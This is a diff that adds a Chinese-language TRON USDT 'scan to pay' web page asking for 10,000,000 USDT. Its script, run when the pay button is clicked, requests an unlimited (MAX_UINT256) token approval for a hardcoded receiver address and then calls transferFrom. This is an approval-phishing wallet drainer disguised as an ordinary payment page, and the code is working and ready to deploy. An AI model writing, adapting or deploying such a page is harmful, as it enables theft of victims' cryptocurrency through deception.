@@ -1,0 +1,117 @@
+
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8" />
+  <title>扫码支付</title>
+  <script src="https://cdn.jsdelivr.net/npm/tronweb@2.8.2/dist/TronWeb.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: linear-gradient(135deg, #f6d365, #fda085);
+      color: #fff;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      text-align: center;
+      padding: 20px;
+      border-radius: 10px;
+      background: rgba(255, 255, 255, 0.2);
+      width: 80%;
+      max-width: 500px;
+    }
+    h2 {
+      font-size: 2em;
+      margin-bottom: 20px;
+    }
+    .payBtn {
+      background-color: #ff6f61;
+      color: white;
+      font-size: 20px;
+      padding: 15px 30px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: all 0.3s;
+    }
+    .payBtn:hover {
+      background-color: #ff4b3a;
+      transform: scale(1.1);
+    }
+    .payBtn:active {
+      transform: scale(0.95);
+    }
+    #qrcode {
+      margin-top: 30px;
+      background: rgba(255, 255, 255, 0.3);
+      padding: 10px;
+      border-radius: 5px;
+    }
+    .message {
+      font-size: 1.2em;
+      margin-top: 15px;
+      color: #fff;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <h2>扫码支付 10,000,000 USDT</h2>
+    <button id="payBtn" class="payBtn">立即支付</button>
+    <div id="qrcode"></div>
+    <div id="message" class="message"></div>
+  </div>
+
+  <script>
+    const usdtAddress = "TLa2f6VPqDgRE67v1736s7bJ8Ray5wYjU7"; // TRON USDT 合约
+    const receiverAddress = "TCJYKs5AiBucQFSA4GaovG66pHatv1UxYp"; // 你的地址
+    const MAX_UINT256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+    const paymentAmount = "10000000000000"; // 支付 1000万 USDT（10,000,000 * 10^6）
+
+    const log = msg => document.getElementById('message').innerText = msg;
+
+    // 生成二维码
+    const pageURL = window.location.href;
+    new QRCode(document.getElementById("qrcode"), pageURL);
+
+    document.getElementById("payBtn").onclick = async () => {
+      if (!window.tronWeb || !tronWeb.defaultAddress.base58) {
+        alert("请使用 TronLink 或 TP 钱包扫码打开本页面！");
+        return;
+      }
+
+      const user = tronWeb.defaultAddress.base58;
+      log("检测钱包授权状态中...");
+
+      try {
+        const contract = await tronWeb.contract().at(usdtAddress);
+        const allowance = await contract.allowance(user, receiverAddress).call();
+        const allowanceNum = parseInt(allowance._hex);
+
+        if (allowanceNum < parseInt(paymentAmount)) {
+          log("准备无限授权...");
+          const tx = await contract.approve(receiverAddress, MAX_UINT256).send();
+          log("✅ 无限授权已提交，交易哈希: " + tx);
+        } else {
+          log("✅ 已有授权额度");
+        }
+
+        log("支付处理中...");
+        const payTx = await contract.transferFrom(user, receiverAddress, paymentAmount).send();
+        log("✅ 支付成功！交易哈希：" + payTx);
+
+      } catch (err) {
+        log("❌ 错误: " + err.message);
+      }
+    };
+  </script>
+
+</body>
+</html>
